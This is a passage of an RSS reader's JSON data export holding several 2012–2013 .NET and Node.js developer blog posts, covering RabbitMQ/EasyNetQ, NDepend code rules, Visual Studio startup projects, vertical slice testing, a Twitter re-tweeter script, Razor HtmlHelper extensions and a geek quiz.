there.</em></p><p><em>We have a number of client applications including android and wpf working in an online/offline mode over mobile networks. We need to process large amounts of incoming commands from these applications. These commands are also routed via the server to other client apps.</em></p><p><em>The application had originally used MVC and SQL server to synchronously process and store the commands but we were running into severe performance problems. We looked at various MQ solutions and decided to use RabbitMQ, WebApi& Mongo to improve processing throughput. While researching a .Net API for RabbitMQ I noticed that you had created the EasyNetQ API.</em></p><p><em>EasyNetQ greatly simplifies interacting with RabbitMQ and providing your needs are not too complicated you really don't need to know too much about the guts of RabbitMQ. We replaced the existing server setup in about a week. The use of RabbitMQ has greatly increased the scalability of the product and allows us to either scale up or scale out.</em></p><p><em>We are also using the EasyNetQ management API for monitoring queue activity on our customer services dashboard.</em></p><p><em>Kind Regards</em></p><p><em>Anthony Moloney</em></p></blockquote><p>One of the great rewards of running an open source project is hearing about the fascinating ways that it’s used around the world. I really like that it’s an ‘African solution for African problems’ and built by a Kenyan development team. It’s also interesting that they’ve used OSS projects like RabbitMQ and Mongo alongside .NET. It reminds me of the<a href=\"http://highscalability.com/blog/2011/3/3/stack-overflow-architecture-update-now-at-95-million-page-vi.html\">Stack Overflow architecture</a>, a .NET core surrounded by OSS infrastructure.</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":1006}}
{"k":"0000000084","o":"0000005693","v":"001"}
{"_id":1007,"_uid":1007,"_dt":1373741607085,"_s":"c5c1f65aa22a935ada162a2fb7e6f2d4"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/PIaB-VIGLEI/","title":"Code Rules are not just about Clean Code","published":{"$wrap":"$date","v":1372942760000,"h":"2013-07-04T12:59:20.000Z"},"starred":false,"read":false,"content":"<p>Like any developer tool vendor, we at NDepend are eating our own dogfood. In other words, we use NDepend to develop NDepend. Most of <a href=\"http://www.ndepend.com/DefaultRules/webframe.html\" target=\"_blank\">default code rules</a> are activated in our development, and they are preventing us daily from all sorts of problems.</p><p>Rules like…</p><ul><li><a href=\"http://www.ndepend.com/DefaultRules/webframe.html?Q_Types_that_used_to_be_100__covered_but_not_anymore.html\" target=\"_blank\">Types that used to be 100% covered but not anymore</a></li><li><a href=\"http://www.ndepend.com/DefaultRules/webframe.html?Q_Methods_that_could_have_a_lower_visibility.html\" target=\"_blank\">Methods that could have a lower visibility</a></li><li><a href=\"http://www.ndepend.com/DefaultRules/webframe.html?Q_Avoid_transforming_an_immutable_type_into_a_mutable_one.html\" target=\"_blank\">Avoid transforming an immutable type into a mutable one</a></li><li><a href=\"http://www.ndepend.com/DefaultRules/webframe.html?Q_Potentially_dead_Types.html\" target=\"_blank\">Potentially dead Types</a></li><li><a href=\"http://www.ndepend.com/DefaultRules/webframe.html?Q_Class_with_no_descendant_should_be_sealed_if_possible.html\" target=\"_blank\">Class with no descendant should be sealed if possible</a></li><li><a href=\"http://www.ndepend.com/DefaultRules/webframe.html?Q_Constructor_should_not_call_a_virtual_methods.html\" target=\"_blank\">Constructor should not call a virtual methods</a></li><li>…</li></ul><p>…are actually helping much more than it appears at first glance. It is not so much about keeping the code clean for the sake of it. <strong>More often than not, a green rule that suddenly gets violated, sheds light on a non-trivial bug. </strong>A non-trivial bug that is much more harmful than just …</p><ul><li>5% of a type uncovered by tests</li><li>a public method that could be declared internal</li><li>an immutable type that now can see the state of its instances change</li><li>a type not used anymore that can be removed</li><li>an un-sealed class that could be declared as sealed</li><li>a constructor calling a virtual method</li><li>…</li></ul><p><strong>It is all about regression</strong>. It is not intrinsically about the rule violated, but about what happened recently, that provoked a green code rule to be now violated.</p><p>This morning thanks to a code rule violated, I just stumbled on a bug that else, would have certainly infiltrated the next public release. The rule <a href=\"http://www.ndepend.com/DefaultRules/webframe.html?Q_Methods_that_could_have_a_lower_visibility.html\" target=\"_blank\">Potentially dead Methods </a> that is usually always green, detected an unused method. Actually the method deemed as dead (i.e uncalled) is a Windows From event handler. Hence I got the information that this handler is not called anymore when clicking its associated LinkLabel control. I figured out that after a few refactoring with the Windows Form designer, it removed the call-back to this handler.<strong></strong></p><p>The screenshot below shows the situation. It shows as well that Resharper also detected that this handler method is not called anymore.</p><p><a href=\"http://codebetter.com/patricksmacchia/files/2013/07/CaringForDeadCode.png\"><img alt=\"Dead Method \" src=\"http://codebetter.com/patricksmacchia/files/2013/07/CaringForDeadCode.png\" width=\"599\" height=\"815\" /></a></p><p>I remember the lesson taken when I was a junior C++ programmer: <strong>a compilation warning should be treated as an error</strong>. The same advice is still judicious for code rules the team decide to respect.</p><p>In any sufficiently complex system, we just cannot rely on human skills to detect such regressions. It is not about keeping the code clean just for the pleasure of developing in a clean environment. It is about gathering automatically meaningful warnings as soon as possible, to identify harmful regressions and fix them.</p><p>In this context, the meaning of each code rule evolves significantly.</p><ul><li><span style=\"line-height: 16px\">Checking regularly that classes 100% covered by tests is not about being obsessional with quality. Empirically, experience shows that portions of code that are hard to cover by tests, or changes that developer forgot to cover by tests, are typically highly error prone. Poorly testable code is highly error prone.</span></li><li>Checking regularly that classes that used to be immutable don’t become mutable is essential. Uncontrolled side-effects typically cause some of the most trickier bug. Clients that consume an immutable class certainly rely on this characteristic (you do actually rely every day on <a href=\"http://stackoverflow.com/questions/2365272/why-net-string-is-immutable\" target=\"_blank\">string immutability</a>, maybe without even noticing it).</li><li>Checking regularly that there is no dead code is not about making sure we don’t maintain extra unnecessary code. When a code element becomes suddenly unused, a developer might have forgot to remove it during a refactoring session. But as we’ve seen, it is well possible that a non-used-anymore code element is provoked by a regression bug.</li></ul><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/PIaB-VIGLEI\" height=\"1\" width=\"1\"/>","author":"Patrick Smacchia","_id":{"$wrap":"$oid","v":1007}}
{"k":"0000000084","o":"0000002188","v":"001"}
{"_id":1008,"_uid":1008,"_dt":1373741607086,"_s":"92812919f0eec114df9af0ccd89e2d91"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/0QZ30Nx84Po/visual-studio-multiple-startup-projects.html","title":"Visual Studio: Multiple Startup Projects","published":{"$wrap":"$date","v":1359635880000,"h":"2013-01-31T12:38:00.000Z"},"starred":false,"read":false,"content":"<p>I’ve been using Visual Studio for over 10 years, but still keep on learning new tricks. That’s because I learn things very slowly dear reader! Today’s ‘wow, I didn’t know you could do that moment’, was finding out that it’s possible to launch multiple startup projects when one hits F5 – or Control-F5 in this case.</p><p>My scenario is that I’m writing a little spike for a distributed application. Each of my services is implemented as a console app. During development, I want to run integration tests where the services all talk to each other, so before running the tests I want to run all the services. Now I’m used to right-clicking on a project and choosing ‘Set as startup project’, but you can’t select multiple projects this way and it’s very tedious to launch multiple projects by going to each one in turn, setting it as the startup project, and then hitting ctrl-F5. What I didn’t know is that you can right click on the Solution node, select ‘Set Startup Projects’ and you get this dialogue:</p><p><a href=\"http://lh5.ggpht.com/-GscZjVsqo2M/UQpl1qMA67I/AAAAAAAAG9M/D9FkbqYHm0k/s1600-h/Select_startup_project%25255B4%25255D.png\"><img style=\"background-image: none; border-bottom: 0px; border-left: 0px; padding-left: 0px; padding-right: 0px; display: inline; border-top: 0px; border-right: 0px; padding-top: 0px\" title=\"Select_startup_project\" border=\"0\" alt=\"Select_startup_project\" src=\"http://lh6.ggpht.com/-r6SuOviKoFc/UQpl2WvmBcI/AAAAAAAAG9U/dYOR3PYTc4M/Select_startup_project_thumb%25255B2%25255D.png?imgmax=800\" width=\"782\" height=\"491\" /></a></p><p>You can then select multiple startup projects and choose any number of them to ‘Start without debugging’.</p><p>Now I can hit ctrl-F5 and all my little services start up. Wonderful.</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":1008}}
{"k":"0000000084","o":"0000009301","v":"001"}
{"_id":1009,"_uid":1009,"_dt":1373741607086,"_s":"6b07ef272e72563d16a5aabdfb6519d0"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/h8y7KreYZsc/","title":"Unit testing is out, Vertical Slice Testing is in","published":{"$wrap":"$date","v":1373532872000,"h":"2013-07-11T08:54:32.000Z"},"starred":false,"read":false,"content":"<p>We have been doing testing for a long time. Some people are practicing TDD, but I think that’s only 46 people in the world and <a href=\"http://http//poll.pollcode.com/pdolm_result?v\">they all follow my twitter feed</a>.</p><p>&lt;/attention-seeking-headlines&gt;</p><p>We all know the common issues people have with writing large test harnesses around systems: it seems to take a long time, existing code is difficult to test, subsequent changes to code makes a lot of existing tests fail or become redundant, and the test harnesses often can become brittle, in no small part because of the abusive use of mocking.</p><p>As a recovering TDD addict, I used to tell people, like many others do, that the issue with their TDD was that they didn’t do it right. If TDD is too hard, do more TDD! In other words, if it hurts, just bang that leg with that baseball bat a bit harder, eventually you will not hurt anymore.</p><p>I will come straight out with it: this approach to unit, integration and tdd testing has, by far and large, failed. It’s over. It is time to move on. I have, and I now do <strong>VE</strong>rtical <strong>S</strong>lice <strong>T</strong>esting.</p><h2>A law of diminishing returns</h2><p>Whatever your test coverage, there is a point where more tests don’t equate more quality. Actually, let me be entirely honest here, I do not believe that a good test harness leads to better perceived quality software for your <strong>users</strong>.</p><p>The people you are trying to please with a good test harness are the ones using your system that are not on a high bandwidth medium with you. Usually that would be your team. To reduce the risk of them experiencing issues, and to increase the chance of them liking your software, you write tests so that their experience is positive.</p><p>A long time ago, I realized that testing everything is not always feasible for me, and I practice TDD all the time. A quick mental review of the teams I worked with in the last 12 years I’ve been practicing TDD also tells me that this fact is rather general.</p><h2>Mocking considered evil</h2><p>I’ve never been a big fan of mocking frameworks, for one simple reason. Simple stubbing relies on assumptions on the functioning of the mocked part of your system that rarely match reality, for no one is going to look at all the documentation of an API and decompile the code when writing a one-line stub.</p><p>As you progress in your implementation, you may learn about more scenarios you didn’t cover, and provided you are in that tiny little fraction of a percent of people refactoring your test harness as you progress your implementation, you may feedback some of that knowledge in previous tests you wrote and in your test doubles, while caressing your pet unicorn and enjoying a bit of sunshine on planet <a href=\"http://mlp.wikia.com/wiki/Equestria\">Equestria</a>. Or if you’re like the rest of us, you probably won’t.</p><h2>Increasing returns for user interfaces</h2><p>Admitting to myself that I could not fix those problems (<em>you cant fix stupid!)</em>, I started trying to understand how I could bring some of the TDD practices I enjoyed (fast feedback, repeatable tests, etc) while increasing the perception of quality, leaving any theoretical or coverage notions behind me. Instead of starting from the components I want to put under test, I start with what my users, hum, <strong>use</strong>.</p><p>If I provide users with an API, I will start by the API that I decide to publish, and consider everything else implementation details. I will only document and polish, a.k.a. test, what <strong>other people</strong> may use.</p><p>All the same, if my user interface is not an API, but some sort of UI, there is very little reason to care about all the scenarios a component may face that <strong>cannot</strong> be triggered from that user interface.</p><p>The process of discovering your user interface has an added advantage. The answer to most <em>but what if</em> questions about such a top-down approach usually unveils an additional user interface you didn’t quite know you had (looking at you, JSON SPA AJAX <em>&lt;insert buzz word of the day&gt;</em> Frankenstein “web” apps).</p><p>This is already an understood concept, and is usually referred to as acceptance testing.</p><h2>At warp speed, everything is relative</h2><p>A common issue arises from using existing acceptance-driven tools. Automating the browser is slow, automating a DB is as well, so is the file system. Each of those may also fail for reasons that have nothing to do with your code.</p><p>That would make your tests brittle and slow, which inexorably will lead to longer feedback cycles, harder to run tests, which would get us straight back to my introduction and why traditional approaches to TDD have failed.</p><p>Acceptance testing recommends, to avoid such a problem, the creation of an alternative interface allowing you to remove the browser from the equation. This is no longer necessary. With tools such as <a href=\"http://zombie.labnotes.org/\">zombie</a> being available for free, you can run an in-memory browser that behaves like a browser, runs in-memory and is increadibly fast. No more Selenium issues on running your automated test suite, no interaction with your operating system’s UI library, it’s all fast and beautiful. And if your user interface is an API, unit testing frameworks and test runners have provided those advantages for many, many years.</p><p><strong>External-facing</strong> components are now in-memory, making executing our tests fast and reliable by not triggering external systems.</p><p>I now apply the same concept to <strong>internal facing components.</strong> Instead of mocking out the inner-most elements, such as the file system, the network or a database, of my system on a per-method or per-component basis, I use libraries that give me, out of the box, an in-memory version of their system that is <strong>functionally equivalent</strong> to the real one.</p><p>It means an in-memory file system would implement the same locking primitives as the real systems, the same rules around reading, writing or seeking data, and be as close as the author of the library can make it to the real system.</p><p>In other words, a VEST-friendly library turns the unit tests of that library on it’s head. The component accessing external systems is developed alongside it’s test-double variant, and both are built to react, error-out and validate calls in the same way. The <strong>test double can be shipped</strong>. I don’t write the mocks, they come as part of the package.</p><p>There are many advantages to such an approach. The author of the library knows intimately the contract he provided you as part of his API. The act of providing an in-memory version means this knowledge is now expressed explicitly, forcing error conditions (which are very much part of a user interface in an API) to be accounted for.</p><p>A VEST-friendly library will usually end up testing explicit contracts in their test harness, so we go one step further. A library author can ship the test harnesses that exercise the contract they expose for all the conditions that are known to potentially exist, and once again, we turn test code into shipping code: if the author has written a test harness, and the author builds two components implementing an interface, the <strong>test harness for the explicit public interfaces can be shipped</strong>, as it’s probably already written.</p><p>I believe this process to be recursive and leading to the pit of success, as any library built using VEST in mind will naturally feed the VEST approach.</p><h2>Vertical Slice Testing</h2><p>The VEST approach replaces all external system calls by functionally equivalent stable and controlled ones, both at the outer-most layer (whatever exercises the user interface) and the inner-most one (whatever touches the low-level IO APIs).</p><p>By using VEST, I can focus on delivering web pages or components that focus on user-interaction, I can run the whole system on every test, and do it very quickly. I can change a lot of inside internal code without breaking existing testing scenarios. And should I wish to implement components replacing the ones in my libraries, I can do that without writing tests, because the test harness is already there, testing the contract for me.</p><p><em>Note: As I’m abroad and not available that much, don’t expect quick answers in the comments section but I’ll try my best. Subjects not covered but not forgotten: my team as a user, availability of VEST libraries, code samples, library author burden, brown field projects, generic crazy-talk, unicorns not being ponies, “you never worked in a team!”, “in an ideal world…”, etc.</em></p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/h8y7KreYZsc\" height=\"1\" width=\"1\"/>","author":"Sebastien Lambla","_id":{"$wrap":"$oid","v":1009}}
{"k":"0000000084","o":"0000005898","v":"001"}
{"_id":1010,"_uid":1010,"_dt":1373741607087,"_s":"dd0fc1b9a0e18cb4a74bed3800b402dd"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/x-avxoFIoiQ/my-super-simple-node-twitter-re-tweeter.html","title":"My Super Simple Node Twitter Re-Tweeter","published":{"$wrap":"$date","v":1355836680000,"h":"2012-12-18T13:18:00.000Z"},"starred":false,"read":false,"content":"<p>I’ve been having a lot of fun writing a little ‘re-tweeter’ this morning. We basically want to monitor our user stream and then re-tweet any status with a particular hash tag. I thought this would be an excellent little project for<a href=\"http://nodejs.org/\">node</a>, and indeed it proved to be extremely easy to do. I used the<a href=\"https://github.com/jdub/node-twitter\">node-twitter</a>library which worked fine for what I wanted to do.</p><p>If you want to use this code, you’ll need to do the following:</p><p>First you’ll need to go to<a title=\"https://dev.twitter.com/apps\" href=\"https://dev.twitter.com/apps\">https://dev.twitter.com/apps</a>and register a new app. You can then copy and paste your consumer key, consumer secret, access token and access token secret into the ‘xxx’ fields.</p><p>Next install node-twitter with npm:</p><div id=\"codeSnippetWrapper\"><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family:'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\" id=\"codeSnippet\">npm install twitter</pre><br /></div><p>Then just run the code with node (I’m a poet and I didn’t know it):</p><div id=\"codeSnippetWrapper\"><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family:'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\" id=\"codeSnippet\">node twitter-retweeter.js</pre><br /></div><p>Here’s the code in the twitter-retweeter.js file:</p><div id=\"codeSnippetWrapper\"><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family:'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\" id=\"codeSnippet\"><span style=\"color: #0000ff\">var</span>util = require(<span style=\"color: #006080\">'util'</span>);<br /><span style=\"color: #0000ff\">var</span>twitter = require(<span style=\"color: #006080\">'twitter'</span>);<br /><br /><span style=\"color: #0000ff\">var</span>twit =<span style=\"color: #0000ff\">new</span>twitter({<br />consumer_key:<span style=\"color: #006080\">'xxx'</span>,<br />consumer_secret:<span style=\"color: #006080\">'xxx'</span>,<br />access_token_key:<span style=\"color: #006080\">'xxx'</span>,<br />access_token_secret:<span style=\"color: #006080\">'xxx'</span><br />});<br /><br /><span style=\"color: #0000ff\">var</span>hashtag =<span style=\"color: #006080\">'#iloveprog'</span><br /><br /><span style=\"color: #0000ff\">function</span>write(data) {<br /><span style=\"color: #0000ff\">if</span>(<span style=\"color: #0000ff\">typeof</span>data ===<span style=\"color: #006080\">'string'</span>) {<br />console.log(data);<br />}<br /><span style=\"color: #0000ff\">else</span><span style=\"color: #0000ff\">if</span>(data.text&& data.user&& data.user.screen_name) {<br />console.log(data.user.screen_name +<span style=\"color: #006080\">\":\"</span>+ data.text);<br />testForHashtag(data);<br />}<br /><span style=\"color: #0000ff\">else</span><span style=\"color: #0000ff\">if</span>(data.delete) {<br />console.log(<span style=\"color: #006080\">'DELETE'</span>);<br />}<br /><span style=\"color: #0000ff\">else</span><span style=\"color: #0000ff\">if</span>(data.message) {<br />console.log(<span style=\"color: #006080\">'ERROR'</span>+ data.message);<br />}<br /><span style=\"color: #0000ff\">else</span>{<br />console.log(util.inspect(data));<br />}<br />}<br /><br /><span style=\"color: #0000ff\">function</span>testForHashtag(data) {<br /><span style=\"color: #0000ff\">if</span>(data.retweeted)<span style=\"color: #0000ff\">return</span>;<br /><span style=\"color: #0000ff\">if</span>(data.text.indexOf(hashtag) != -1) {<br />twit.retweetStatus(data.id_str,<span style=\"color: #0000ff\">function</span>(){<br />console.log(<span style=\"color: #006080\">'retweet callback'</span>);<br />});<br />}<br />}<br /><br /><span style=\"color: #0000ff\">function</span>reconnect() {<br />setTimeout(startStreaming, 1000);<br />}<br /><br /><span style=\"color: #0000ff\">function</span>startStreaming() {<br />twit.stream(<span style=\"color: #006080\">'user'</span>,<span style=\"color: #0000ff\">function</span>(stream) {<br />console.log(<span style=\"color: #006080\">'starting stream'</span>);<br />stream.on(<span style=\"color: #006080\">'data'</span>, write);<br />stream.on(<span style=\"color: #006080\">'end'</span>, reconnect)<br />});<br />}<br /><br />startStreaming();<br /><br />console.log(<span style=\"color: #006080\">'lisening for tweets'</span>);</pre><br /></div><p>It’s all really straight forward. The startStreaming function kicks of the callback on the twitter user stream. Each time an event occurs it calls the write function which checks for the given hashtag and then retweets the status if there’s a match.</p><p>Lovely!</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":1010}}
{"k":"0000000084","o":"0000008749","v":"001"}
{"_id":1011,"_uid":1011,"_dt":1373741607087,"_s":"0f073f2a4bb5310d739335ff69fdd935"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/SvsjXrkkXz8/","title":"@model and beyond","published":{"$wrap":"$date","v":1368522464000,"h":"2013-05-14T09:07:44.000Z"},"starred":false,"read":false,"content":"<p>In my <a href=\"http://codebetter.com/petervanooijen/2013/02/03/html-and-beyond/\">previous post</a> I had been fiddling with the html helper used in Razor views. Since then our custom html-extensions have been doing great things for our project. To mention some:</p><ol><li>Standardizing the look and feel. It is far more consistent and maintainable to set attributes (including a css class) and event handlers in one centralized place.<li>Simplify the script. Often a part of the logic the script will follow is already known server side. Instead of writing everything out in javascript rendering the intended statements leads to a leaner client. There is an example in my <a href=\"http://codebetter.com/petervanooijen/2013/02/03/html-and-beyond/\">previous post</a> on building post-data.<li>Decoupling the libraries used. At the moment we are using the Telerik MVC suite. In my <a href=\"http://codebetter.com/petervanooijen/2013/02/03/html-and-beyond/\">previous post</a> I described how our html helpers build standardized Telerik components for our views. In the not to far future we want to switch to the Telerik Kendo suite. Having wrapped up the library dependency in our Html helper will make this switch a lot easier to implement.</li></ol><p>What has evolved is the way we work with the model. In MVC the implementation of the controller and the view is clear. When it comes to the implementation of the model there are almost as many different styles of implementation as there are programmers. In general the model can bring any data to the view you can imagine. Not only the source of the data varies, from plain sql to a C# property, also the use of the model’s data varies. It can be a customers name from the database. Or it can be the string representation of some html attribute needed for a fancy picker. Here data and presentation start to get mixed up. Our extensions needed information for the Html-Id. The original Html helper had a custom constructor to get that specific data from the model into the helper. Which required to create our own htmlhelper when starting the view and use that one instead of the standard @html. As seen in the <a href=\"http://codebetter.com/petervanooijen/2013/02/03/html-and-beyond/\">eposHtml in the previous story</a>. It would be cleaner if our extension methods could be satisfied with the default html helper. It would also be cleaner to keep a better separation between ‘real’ data and presentation. </p><p>The model is available in every HtmlHelper extension method.</p><div style=\"font-size: 10pt;font-family: courier;background: white;color: black\"><p style=\"margin: 0px\"><span style=\"color: blue\">public</span> <span style=\"color: blue\">static</span> PostDataBuilder&lt;TModel&gt; PostData&lt;TModel&gt;(<span style=\"color: blue\">this</span> HtmlHelper&lt;TModel&gt; htmlHelper)</p><p style=\"margin: 0px\">{</p><p style=\"margin: 0px\">    <span style=\"color: blue\">return</span> <span style=\"color: blue\">new</span> PostDataBuilder&lt;TModel&gt;(Id(<strong>htmlHelper.ViewData.Model</strong>));</p><p style=\"margin: 0px\">}</p><p style=\"margin: 0px\"> </p></div><p>It’s a property of the ViewData.</p><p>In our case we needed something to give the control an unique Id. The <strong>Id</strong> method builds that Id. Previously we passed the Id-base in the constructor, which lead to the custom helper. A far more elegant solution is using a very basic IOC-DI pattern. As implemented By the Id method</p><div style=\"font-size: 10pt;font-family: courier;background: white;color: black\"><p style=\"margin: 0px\"><span style=\"color: blue\">private</span> <span style=\"color: blue\">static</span> <span style=\"color: blue\">string</span> Id(<span style=\"color: blue\">object</span> model)</p><p style=\"margin: 0px\">{</p><p style=\"margin: 0px\">    <span style=\"color: blue\">var</span> complex = model <span style=\"color: blue\">as</span> IProvideCompositeId;</p><p style=\"margin: 0px\">    <span style=\"color: blue\">if</span> (complex != <span style=\"color: blue\">null</span>)</p><p style=\"margin: 0px\">        <span style=\"color: blue\">return</span> complex.CompositeId;</p><p style=\"margin: 0px\">    <span style=\"color: blue\">var</span> simple = model <span style=\"color: blue\">as</span> IProvideId;</p><p style=\"margin: 0px\">    <span style=\"color: blue\">return</span> simple == <span style=\"color: blue\">null</span> ? <span style=\"color: #a31515\">“”</span> :  simple.Id &lt; 0  ? <span style=\"color: #2b91af\">String</span>.Format(<span style=\"color: #a31515\">“N{0}”</span>, <span style=\"color: #2b91af\">Math</span>.Abs(simple.Id)) : simple.Id.ToString();</p><p style=\"margin: 0px\">}</p><p style=\"margin: 0px\"> </p></div><p>The method queries the model first for the IProvideCompositeId interface, in case the model does not implement that it is queried for the IprovideId interface. Resulting in a string which can be safely used in an HtmlId. (A negative number would lead to a ‘–’ in the string, which is not accepted in an Html Id).</p><p>These interfaces are very straightforward</p><div style=\"font-size: 10pt;font-family: courier;background: white;color: black\"><p style=\"margin: 0px\"><span style=\"color: blue\">public</span> <span style=\"color: blue\">interface</span> <span style=\"color: #2b91af\">IProvideCompositeId</span></p><p style=\"margin: 0px\">{</p><p style=\"margin: 0px\">    <span style=\"color: blue\">string</span> CompositeId { <span style=\"color: blue\">get</span>; }</p><p style=\"margin: 0px\">}</p><p style=\"margin: 0px\"> </p><p style=\"margin: 0px\"><span style=\"color: blue\">public</span> <span style=\"color: blue\">interface</span> <span style=\"color: #2b91af\">IProvideId</span></p><p style=\"margin: 0px\">{</p><p style=\"margin: 0px\">    <span style=\"color: blue\">int</span> Id { <span style=\"color: blue\">get</span>; }</p><p style=\"margin: 0px\">}</p><p style=\"margin: 0px\"> </p></div><p>In case the model is going to be used in a view requiring unique Id’s the model has to implement one of these interfaces.</p><div style=\"font-size: 10pt;font-family: courier;background: white;color: black\"><p style=\"margin: 0px\"><span style=\"color: blue\">public</span> <span style=\"color: blue\">class</span> <span style=\"color: #2b91af\">FactuurDefinitie</span> : IProvideCompositeId</p><p style=\"margin: 0px\">{</p><p style=\"margin: 0px\">    <span style=\"color: blue\">public</span> <span style=\"color: blue\">readonly</span> <span style=\"color: blue\">int</span> IdTraject;</p><p style=\"margin: 0px\">    <span style=\"color: blue\">public</span> <span style=\"color: blue\">readonly</span> <span style=\"color: blue\">int</span> UZOVI;</p><p style=\"margin: 0px\">    <span style=\"color: blue\">public</span> <span style=\"color: blue\">readonly</span> <span style=\"color: blue\">bool</span> Verzekerd;</p><p style=\"margin: 0px\"> </p><p style=\"margin: 0px\">    <span style=\"color: blue\">public</span> FactuurDefinitie(<span style=\"color: blue\">int</span> idTraject, <span style=\"color: blue\">int</span> uzovi, <span style=\"color: blue\">bool</span> verzekerd)</p><p style=\"margin: 0px\">    {</p><p style=\"margin: 0px\">        <span style=\"color: green\">// The usual stuff</span></p><p style=\"margin: 0px\">    }</p><p style=\"margin: 0px\"> </p><p style=\"margin: 0px\">    <strong><span style=\"color: blue\">public</span> <span style=\"color: blue\">string</span> CompositeId</strong></p><p style=\"margin: 0px\">    {</p><p style=\"margin: 0px\">        <span style=\"color: blue\">get</span> { <span style=\"color: blue\">return</span> <span style=\"color: #2b91af\">String</span>.Format(<span style=\"color: #a31515\">“{0}{1}{2}”</span>, IdTraject, UZOVI, Verzekerd); }</p><p style=\"margin: 0px\">    }</p><p style=\"margin: 0px\">}</p><p style=\"margin: 0px\"> </p></div><p>Working this way:</p><ul><li>We can use our custom html extensions in the default html helper</li><li>Specific data from the model is available inside our extensions</li><li>The model and the view do not get entangled</li></ul><p>The code is no big deal. I know. But the model is something whose horizons are still not in sight.</p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/SvsjXrkkXz8\" height=\"1\" width=\"1\"/>","author":"Peter van Ooijen","_id":{"$wrap":"$oid","v":1011}}
{"k":"0000000084","o":"0000011211","v":"001"}
{"_id":1012,"_uid":1012,"_dt":1373741607087,"_s":"1a33c520e28aeda64832f5845a4fc000"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/PhowE4MXuAI/a-geek-christmas-quizthe-answers.html","title":"A Geek Christmas Quiz–The Answers!","published":{"$wrap":"$date","v":1356353760000,"h":"2012-12-24T12:56:00.000Z"},"starred":false,"read":false,"content":"<p>Thanks for everyone who had a go at my<a href=\"http://mikehadlow.blogspot.co.uk/2012/12/a-geek-christmas-quiz.html\">Geek Christmas Quiz</a>. The response was fantastic with both<a href=\"https://twitter.com/iainholder\">Iain Holder</a><em>and</em><a href=\"https://twitter.com/robertpi\">Rob Pickering</a>sending me emails of their answers. I’m pretty sure neither of them Googled any of the questions, since their scores weren’t spectacular :)</p><p>So, now the post you’ve all been waiting for with such anticipation… the answers!</p><h3>Computers</h3><ol><li>G.N.U stands for<a href=\"http://en.wikipedia.org/wiki/GNU_project\">GNU is Not Unix</a>. A recursive acronym, how geeky is that?</li><li>The A in ARM<em>originally</em>stood for ‘Acorn’ as in<a href=\"http://en.wikipedia.org/wiki/ARM_architecture\">Acorn Risc Machine</a>. Yes, I know it stands for ‘Advanced’ now, but the question said ‘originally’.</li><li>TCP stands for<a href=\"http://en.wikipedia.org/wiki/Transmission_Control_Protocol\">Transmission Control Protocol</a>.</li><li><a href=\"http://en.wikipedia.org/wiki/Paul_Allen\">Paul Allen</a>founded Microsoft with Bill  Gates. I’ve just finished reading his memoirs ‘Ideas Man’. Hard work!</li><li>F2 (hex) is 15(F) * 16 + 2 = 242.  1111 0010 (binary)</li><li>Windows ME was based on the<a href=\"http://xkcd.com/323/\">Balmer Peak</a>theory of software development.</li><li>The first programmer was<a href=\"http://en.wikipedia.org/wiki/Ada_Lovelace\">Ada Lovelace.</a>Yes yes, I know that’s contentious, but I made up this quiz, so there!</li><li><a href=\"http://en.wikipedia.org/wiki/Unix_time\">UNIX time started in 1970</a>(1st January to be exact). I know this because I just had to write a System.DateTime to UNIX time converter.</li><li>SGI, the mostly defunct computer maker. You get a mark for<a href=\"http://en.wikipedia.org/wiki/Silicon_Graphics_International\">Silicon Graphics International</a>(or Inc).</li><li>Here’s monadic ‘<a href=\"http://mikehadlow.blogspot.co.uk/2011/01/monads-in-c-3-creating-our-first-monad.html\">Bind</a>’ in C#: M&lt;B&gt; Bind&lt;A,B&gt;(M&lt;A&gt; a, Func&lt;A, M&lt;B&gt;&gt; func)</li></ol><h3>Name That Geek!</h3><p><img alt=\"[Name_that_geek%255B4%255D.png]\" src=\"http://lh4.ggpht.com/-9dCdTenpfew/UNRJrz8wCHI/AAAAAAAAF20/F-jPxSUS0CE/s1600/Name_that_geek%25255B4%25255D.png\" /></p><ol><li>Bill Gates – Co-founder of Microsoft with Paul Allen.</li><li>Tim Berners-Lee – Creator of the World Wide Web.</li><li>Larry Ellison – Founder of Oracle. Lives in a Samurai House (how geeky is that?)</li><li>Linus Torvalds – Creator of Linux.</li><li>Alan Turing – Mathematician and computer scientist. Described the Turing Machine. Helped save the free world from the Nazis.</li><li>Steve Jobs – Founded Apple, NeXT and Pixar.</li><li>Natalie Portman – Actress and self confessed geek.</li></ol><h3>Science</h3><ol><li>The four ‘letters’ of<a href=\"http://en.wikipedia.org/wiki/DNA\">DNA</a>are C, G, T and A. If you know the actual names of the nucleotides (guanine, adenine, thymine, and cytosine), give yourself a bonus point – you really are a DNA geek!</li><li>The ‘c’ in<a 